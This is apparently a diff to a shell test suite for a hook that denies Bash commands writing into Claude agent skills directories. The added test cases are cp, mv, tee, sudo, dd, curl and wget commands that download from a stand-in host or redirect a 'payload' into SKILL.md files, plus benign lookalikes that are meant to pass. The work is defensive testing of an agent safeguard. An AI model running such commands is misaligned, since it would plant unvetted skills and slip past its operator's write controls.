@@ -188,6 +188,26 @@ expect_deny "curl --output-dir .claude/skills/evil -O https://x.example.com/SKIL
 expect_deny "git -C .claude/skills/evil clone https://x.example.com/r"
 # Optional dash-flags may sit between the -C skills value and the clone verb.
 expect_deny "git -C .claude/skills/evil --bare clone https://x.example.com/r"
+# Plain cp/mv/tee installs into a skills path stay DENY at command position — the
+# CMDPOS anchoring added to SKILLS_WRITE_RX must not weaken the real-write coverage.
+expect_deny "cp template.md .claude/skills/foo/SKILL.md"
+expect_deny "mv f .claude/skills/foo/SKILL.md"
+expect_deny "tee .claude/skills/x/SKILL.md"
+# Wrapper-prefixed skills writes stay DENY (WRAP covers "sudo cp"/"sudo tee").
+expect_deny "sudo cp f .claude/skills/x/SKILL.md"
+expect_deny "sudo tee .claude/skills/x/SKILL.md"
+# Top-level relative "skills/<name>/SKILL.md" writes are DENY too — the Write tool
+# blocks the same path, so Bash must not be the asymmetric bypass (finding 2). The
+# path may be a later arg (cp f skills/…) or the verb's first token (tee skills/…).
+expect_deny "cp f skills/x/SKILL.md"
+expect_deny "mv a skills/x/SKILL.md"
+expect_deny "tee skills/x/SKILL.md"
+expect_deny "dd of=skills/x/SKILL.md if=/tmp/payload"
+expect_deny "curl -o skills/x/SKILL.md https://x.example.com/s"
+expect_deny "wget -O skills/x/SKILL.md https://x.example.com/s"
+# A redirect into a relative skills path is a write too (with or without a space).
+expect_deny "cat payload > skills/x/SKILL.md"
+expect_deny "cat payload >skills/x/SKILL.md"
 
 echo ""
 echo "6. INSTALL write lookalikes still pass (download without writing a skill)"
@@ -208,6 +228,17 @@ expect_pass "git -C .claude/skills/foo add clone"
 expect_pass "git -C .claude/skills/foo grep clone"
 expect_pass "git -C .claude/skills/foo log --grep clone"
 expect_pass "git -C .claude/skills/foo branch clone"
+# A write VERB that merely appears inside a string/comment/other-command's arg has
+# no command-position separator before it and must NOT fire (finding 1 — the
+# SKILLS_WRITE_RX regression where these were wrongly DENY).
+expect_pass 'git commit -m "add cp helper for .claude/skills/x/SKILL.md"'
+expect_pass "# cp template.md .claude/skills/foo/SKILL.md when ready"
+expect_pass 'echo "run: tee .claude/skills/x/SKILL.md"'
+# A relative skills path merely MENTIONED (not written) passes; and a lookalike
+# directory ("myskills/…") is not the skills dir and must not over-block (finding 2).
+expect_pass "echo skills/x/SKILL.md"
+expect_pass "echo my-skills/x/SKILL.md"
+expect_pass "cp foo myskills/x/SKILL.md"
 
 echo ""
 echo "7. Benign lookalikes still pass (zero over-blocking)"
